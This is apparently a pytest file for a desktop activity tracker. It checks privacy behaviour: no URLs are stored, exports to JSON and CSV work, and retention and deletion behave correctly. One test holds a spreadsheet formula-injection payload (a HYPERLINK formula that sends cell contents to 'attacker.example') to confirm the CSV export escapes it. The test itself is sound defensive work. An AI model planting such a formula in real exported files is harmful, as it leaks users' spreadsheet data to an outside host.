"""Privacy and data lifecycle of the activity record: what is stored, exported and deleted."""

import csv
import json
import time
from datetime import UTC, datetime, timedelta

from focuslab.activity.stats import local_day_bounds
from focuslab.domain.activity import ActivitySpan, Category, SpanKind
from focuslab.services.activity_service import activity_report
from focuslab.services.export_service import (
    apply_retention,
    delete_all,
    export_activity_csv,
    export_json,
)
from focuslab.storage.activity_repository import ActivityRepository
from focuslab.storage.repository import Repository
from focuslab.storage.sqlite_db import connect

MIN = 60_000


def scenario_db(tmp_path, daily_scenario):
    yesterday = datetime.now().astimezone().date() - timedelta(days=1)
    start, end = local_day_bounds(yesterday)
    return connect(daily_scenario(tmp_path / "p.db", start + 9 * 60 * MIN)), start, end


def all_text(conn) -> list[str]:
    values = []
    tables = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")]
    for table in tables:
        for row in conn.execute(f"SELECT * FROM {table}"):  # every column of every table
            values += [v for v in tuple(row) if isinstance(v, str)]
    return values


def test_the_database_never_holds_urls_paths_or_titles(tmp_path, daily_scenario):
    conn, *_ = scenario_db(tmp_path, daily_scenario)
    text = all_text(conn)
    assert text  # sanity: there is data
    for value in text:  # no URL, path, query or title-like text anywhere
        assert not any(mark in value for mark in ("://", "\\", "/", "?")), value
    conn.close()


def test_full_export_contains_activity_and_per_session_export_does_not(tmp_path, daily_scenario):
    conn, start, end = scenario_db(tmp_path, daily_scenario)
    activity_report(conn, start, end)  # stores the automatic sessions
    repo = Repository(conn)
    full = json.loads(export_json(repo, tmp_path / "all.json").read_text("utf-8"))
    act = full["activity"]
    assert len(act["spans"]) == 5 and len(act["automatic_sessions"]) == 3
    assert {s["site"] for s in act["spans"]} == {None, "github.com", "youtube.com"}
    youtube = act["spans"][2]
    assert (youtube["category"], youtube["reason"]) == ("UNKNOWN", "AMBIGUOUS_SITE")
    assert [e["type"] for e in act["system_events"]][:1] == ["START"]
    partial = json.loads(export_json(repo, tmp_path / "s.json", []).read_text("utf-8"))
    assert "activity" not in partial
    with export_activity_csv(repo, tmp_path / "a.csv").open(encoding="utf-8-sig") as f:
        rows = list(csv.DictReader(f))
    assert len(rows) == 5 and rows[1]["site"] == "github.com" and rows[3]["kind"] == "IDLE"
    conn.close()


def test_csv_export_keeps_formula_like_titles_as_text(tmp_path):
    """A website picks its own title; Excel must not run it as a formula from the CSV."""
    conn = connect(tmp_path / "f.db")
    title = '=HYPERLINK("http"&":"&"//attacker.example/"&B2,"Open")'
    ActivityRepository(conn).insert_span(
        ActivitySpan(MIN, 2 * MIN, SpanKind.ACTIVE, "chrome.exe", "@SUM(1+1)",
                     domain="evil.example", page_title=title)
    )
    repo = Repository(conn)
    with export_activity_csv(repo, tmp_path / "a.csv").open(encoding="utf-8-sig") as f:
        [row] = list(csv.DictReader(f))
    assert row["page_title"] == "'" + title
    assert row["product_name"] == "'@SUM(1+1)"
    assert row["program"] == "chrome.exe" and row["site"] == "evil.example"
    assert row["duration_s"] == "60.0"  # numbers are untouched
    full = json.loads(export_json(repo, tmp_path / "a.json").read_text("utf-8"))
    assert full["activity"]["spans"][0]["page_title"] == title  # JSON keeps the raw value
    conn.close()


def test_retention_removes_old_activity_and_forgets_unused_programs(tmp_path):
    conn = connect(tmp_path / "r.db")
    activity = ActivityRepository(conn)
    now = datetime(2026, 10, 20, tzinfo=UTC)
    old = int((now - timedelta(days=40)).timestamp() * 1000)
    recent = int((now - timedelta(days=2)).timestamp() * 1000)
    activity.insert_span(ActivitySpan(old, old + MIN, SpanKind.ACTIVE, "oldgame.exe"))
    activity.insert_span(ActivitySpan(recent, recent + MIN, SpanKind.ACTIVE, "code.exe"))
    activity.add_events([(old, "START", None), (recent, "START", None)])
    assert apply_retention(Repository(conn), 0, now) == 0  # 0 keeps everything
    assert len(activity.spans_between(0, 2**62)) == 2
    apply_retention(Repository(conn), 30, now)
    assert [s.exe_name for s in activity.spans_between(0, 2**62)] == ["code.exe"]
    assert [r[0] for r in conn.execute("SELECT exe_name FROM app")] == ["code.exe"]
    assert len(activity.events_between(0, 2**62)) == 1
    conn.close()


def test_delete_all_removes_records_but_keeps_choices(tmp_path, daily_scenario):
    conn, start, end = scenario_db(tmp_path, daily_scenario)
    activity = ActivityRepository(conn)
    activity.set_rule("site", "youtube.com", Category.STUDY)
    activity.set_exclusions(["keepass.exe"], ["bank.com"])
    activity_report(conn, start, end)
    delete_all(Repository(conn))
    for table in ("activity_span", "system_event", "auto_session", "browser_state", "app",
                  "activity_feedback"):
        assert conn.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0] == 0, table
    assert activity.user_rules().sites == {"youtube.com": Category.STUDY}
    assert activity.exclusions() == (frozenset({"keepass.exe"}), frozenset({"bank.com"}))
    assert Repository(conn).get_setting("consent.recording") == "1"
    conn.close()


def test_a_month_of_activity_stays_fast(tmp_path):
    """45,000 spans (30 days x 1,500 switches): reports must stay interactive."""
    conn = connect(tmp_path / "big.db")
    activity = ActivityRepository(conn)
    today = datetime.now().astimezone().date()
    apps = ["code.exe", "chrome.exe", "slack.exe", "winword.exe", "explorer.exe"]
    sites = [None, "github.com", "youtube.com", "docs.python.org"]
    with activity.transaction():
        for d in range(30):
            day_start, _ = local_day_bounds(today - timedelta(days=d))
            t = day_start + 8 * 3_600_000
            for i in range(1500):
                exe = apps[i % len(apps)]
                site = sites[i % len(sites)] if exe == "chrome.exe" else None
                kind = SpanKind.IDLE if i % 97 == 0 else SpanKind.ACTIVE
                length = 20_000 + (i * 7919) % 40_000
                activity.insert_span(ActivitySpan(t, t + length, kind,
                                                  exe if kind is SpanKind.ACTIVE else None,
                                                  domain=site))
                t += length
    day_start, day_end = local_day_bounds(today - timedelta(days=1))
    began = time.perf_counter()
    _, day = activity_report(conn, day_start, day_end)
    day_s = time.perf_counter() - began
    month_start, _ = local_day_bounds(today - timedelta(days=29))
    began = time.perf_counter()
    _, month = activity_report(conn, month_start, day_end)
    month_s = time.perf_counter() - began
    assert day.observed_ms > 0 and month.observed_ms > day.observed_ms
    assert sum(month.by_category.values()) == month.observed_ms
    assert day_s < 2.0 and month_s < 20.0, (day_s, month_s)
    conn.close()
